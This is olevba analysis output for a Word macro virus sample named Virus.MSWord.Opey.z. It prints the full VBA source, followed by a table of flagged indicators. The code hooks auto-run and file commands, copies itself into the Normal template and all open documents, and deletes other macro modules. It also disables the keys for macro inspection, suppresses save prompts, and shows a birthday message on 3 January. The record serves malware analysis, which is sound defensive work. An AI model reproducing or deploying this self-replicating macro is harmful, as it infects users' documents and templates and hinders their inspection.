olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.z
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.z - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BirthDay.bas 
in file: Virus.MSWord.Opey.z - OLE stream: 'Macros/VBA/BirthDay'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public is_viewed As Boolean
Public cur_app_caption As String

Private Sub BirthDay()
    On Error Resume Next
        
    With Options
        .ConfirmConversions = False
        .VirusProtection = True
        .SaveNormalPrompt = True
        .SavePropertiesPrompt = True
        .CreateBackup = False
        .EnableSound = False
    End With
        
    Application.CommandBars("Menu Bar").Controls("Tools").Enabled = True
    Application.CommandBars("Menu Bar").Controls("Tools").Visible = True
    Application.CommandBars("Menu Bar").Controls("Insert").Controls("AutoText").Visible = False
    Application.CommandBars("Menu Bar").Controls("View").Controls("ToolBars").Visible = False
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyT, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyI, wdKeyAlt)).Disable
        
    CustomizationContext = NormalTemplate
    
    Call Greetings
End Sub
Private Sub Greetings()
    On Error Resume Next
    
    Dim template_infected As Boolean
    Dim doc_infected As Boolean
    Dim copyobject As String
    
    ActiveDocument.ReadOnlyRecommended = False
    ActiveDocument.SpellingChecked = True
    
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count Step 1
        copyobject = NormalTemplate.VBProject.VBComponents(i).Name
        If copyobject <> "BirthDay" Then
            Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="BirthDay", Object:=wdOrganizerObjectProjectItems
        End If
    Next i
    
    NormalTemplate.Save
    
    For Each openDoc In Documents
        doc_infected = False
        With openDoc
            'For Replication
            For i = 1 To openDoc.VBProject.VBComponents.Count Step 1
                copyobject = openDoc.VBProject.VBComponents(i).Name
                If copyobject = "BirthDay" Then
                    doc_infected = True
                End If
                If (copyobject <> "BirthDay") And (copyobject <> "ThisDocument") And (copyobject <> "Reference to Normal") Then
                    Application.OrganizerDelete Source:=openDoc.FullName, Name:=copyobject, Object:=wdOrganizerObjectProjectItems
                End If
            Next i
            If doc_infected = False Then
                Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=openDoc.FullName, Name:="BirthDay", Object:=wdOrganizerObjectProjectItems
            End If
        End With
        With Dialogs(wdDialogFileSummaryInfo)
            .Title = "Happy Birth Day HASHI"
            .Subject = "Remember About HASHI's Birthday "
            .Author = "Creative Well Wisher"
            .Category = "Infected"
            .Keywords = "Birthday"
            .Comments = "03rd January is HASHI'S Birth Day . Don't Forget to wish her"
            .Execute
        End With

        If Options.SaveNormalPrompt Then
            Options.SaveNormalPrompt = False
        End If
            
    Next openDoc
    Call wish_her
End Sub
Private Sub wish_her()
    On Error Resume Next
    Dim cur_win_caption As String
    Dim new_document As Document
    If (Day(Date) = 3) And (Month(Date) = 1) Then
        If Application.Windows.Count >= 1 Then
            cur_app_caption = Application.Caption
            cur_app_caption = ActiveWindow.Caption
        
            MsgBox "Today is HASHI's Birth Day" & vbCr & "You Must Wish Her Today ?", vbOKOnly, "About Birth Day"
                
            Application.Caption = "Happy Birthday For HASHI"
            Application.WindowState = wdWindowStateMaximize
        
            Set new_document = Application.Documents.Add
            new_document.Activate
            
            ActiveWindow.Caption = "Happy Birthday For HASHI"
            ActiveWindow.View.ShowAnimation = True
            ActiveWindow.WindowState = wdWindowStateMaximize
            
            MsgBox "Another Doccument Is Added", vbOKOnly, "About Birth Day"
        
            ActiveDocument.Paragraphs.Alignment = wdAlignParagraphCenter
            Selection.Font.Name = "Times New Roman"
            Selection.Font.Size = 20
            Selection.Font.ColorIndex = wdPink
            Selection.Font.Animation = wdAnimationSparkleText
            Selection.TypeText Text:="Happy Birth Day" & vbCr
            is_viewed = True
            Selection.Font.Size = 40
            Selection.Font.ColorIndex = wdBlue
            Selection.Font.Bold = True
            Selection.Font.Italic = True
            Selection.TypeText Text:="HASHI"
        End If
   End If
End Sub

Public Sub FileSave()
    On Error Resume Next
    Call BirthDay
    ActiveDocument.Save
End Sub
Public Sub FileClose()
    On Error Resume Next
    If is_viewed Then
        is_viewed = False
        Application.Caption = cur_app_caption
        MsgBox "Thank You! You are wonderfull.", vbOKOnly, "About Birth Day"
    Else
        Call BirthDay
    End If
    If ActiveDocument.Words(1) <> "" And ActiveDocument.Saved = False Then
        ActiveDocument.Save
    End If
    ActiveDocument.Close
End Sub
Public Sub FileExit()
    On Error Resume Next
    Call BirthDay
    If ActiveDocument.Words(1) <> "" And ActiveDocument.Saved = False Then
        ActiveDocument.Save
    End If
    Application.Quit
End Sub
Public Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    BirthDay
End Sub
Public Sub AutoOpen()
    On Error Resume Next
    Call BirthDay
    ActiveDocument.Save
End Sub
Public Sub AutoExec()
    On Error Resume Next
    Call BirthDay
    ActiveDocument.Save
End Sub
Public Sub FileSaveAs()
    On Error Resume Next
    Call BirthDay
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Public Sub FilePageSetup()
    On Error Resume Next
    Call BirthDay
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Public Sub FilePrint()
    On Error Resume Next
    Call BirthDay
    Dialogs(wdDialogFilePrint).Show
End Sub
Public Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call BirthDay
    ActiveDocument.Save
End Sub
Public Sub AutoClose()
    On Error Resume Next
    If is_viewed Then
        is_viewed = False
        Application.Caption = cur_app_caption
        MsgBox "Thank You! You are wonderfull.", vbOKOnly, "About Birth Day"
    Else
        Call BirthDay
    End If
End Sub
Public Sub AutoExit()
    On Error Resume Next
    Call BirthDay
    Application.Quit
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

